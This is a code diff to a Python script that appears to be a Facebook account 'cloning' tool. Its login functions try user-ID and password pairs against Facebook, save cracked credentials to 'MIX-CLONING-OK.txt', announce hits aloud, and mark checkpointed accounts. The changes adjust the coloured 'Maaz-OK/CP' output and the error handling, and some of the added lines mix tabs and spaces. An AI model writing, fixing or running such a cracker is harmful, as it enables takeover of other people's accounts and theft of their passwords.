@@ -195,7 +195,6 @@ def clear():
     print(logo)
 
 
-
 def main():
 	clear()
 	try:
@@ -384,6 +383,7 @@ def login1(uid):
                 oks.append(uid)
                 break
             elif "www.facebook.com" in rp['error']['message']:
+		print(f'\r\r\r\r\r\x1b[38;5;196m[\x1b[38;5;196mMaaz\033[1;97m-\x1b[38;5;196mCP\x1b[38;5;196m] \x1b[38;5;196m{uid} \033[1;97m● \x1b[38;5;196m{pw}\033[1;97m')    
                 cps.append(uid)
                 break
             else:continue
@@ -449,17 +449,9 @@ def login2(uid):
                     open("MIX-CLONING-OK.txt","a").write(uid+"|"+pw+"\n")
                 oks.append(uid)
                 break
-            elif "www.facebook.com" in rp['error']['message']:
-                print(f'\r\r\r\r\r\x1b[38;5;46m[\x1b[38;5;46mMaaz\033[1;97m-\x1b[38;5;46mOK\x1b[38;5;46m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m')
-                try:
-                    os.system('espeak -a 300 "Cracked Ok id"')
-                except:
-                    pass
-                try:
-                    open("/sdcard/MIX-CLONING-OK.txt","a").write(uid+"|"+pw+"\n")
-                except:
-                    open("MIX-CLONING-OK.txt","a").write(uid+"|"+pw+"\n")
-                oks.append(uid)
+            elif "www.facebook.com" in rp.get("error", {}).get("message", ""):
+                print(f'\r\r\r\r\r\x1b[38;5;196m[\x1b[38;5;196mMaaz\033[1;97m-\x1b[38;5;196mCP\x1b[38;5;196m] \x1b[38;5;196m{uid} \033[1;97m● \x1b[38;5;196m{pw}\033[1;97m')
+                cps.append(uid)
                 break
             else:continue
         loop+=1
@@ -525,6 +517,7 @@ def login3(uid):
                 oks.append(uid)
                 break
             elif "www.facebook.com" in rp['error']['message']:
+		print(f'\r\r\r\r\r\x1b[38;5;196m[\x1b[38;5;196mMaaz\033[1;97m-\x1b[38;5;196mCP\x1b[38;5;196m] \x1b[38;5;196m{uid} \033[1;97m● \x1b[38;5;196m{pw}\033[1;97m')  
                 cps.append(uid)
                 break
             else:continue
